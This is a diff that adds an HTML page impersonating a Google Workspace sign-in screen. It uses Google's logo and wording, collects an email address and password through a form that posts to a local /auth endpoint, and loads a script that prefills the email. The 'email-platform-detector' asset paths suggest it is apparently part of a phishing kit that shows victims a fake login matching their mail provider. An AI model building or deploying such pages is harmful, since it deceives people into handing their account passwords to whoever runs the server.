@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login to Google Workspace</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/email-platform-detector/public/assets/styles/login.css" />
+</head>
+<body class="theme-google">
+  <div class="login-container">
+    <img id="provider-logo" src="/email-platform-detector/public/assets/logos/google.png" alt="Google Logo" />
+    <h2>Welcome to Google Workspace</h2>
+    <form action="/auth" method="POST">
+      <input type="email" id="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Login</button>
+    </form>
+  </div>
+  <script src="/email-platform-detector/public/scripts/prefill-email.js"></script>
+</body>
+</html>
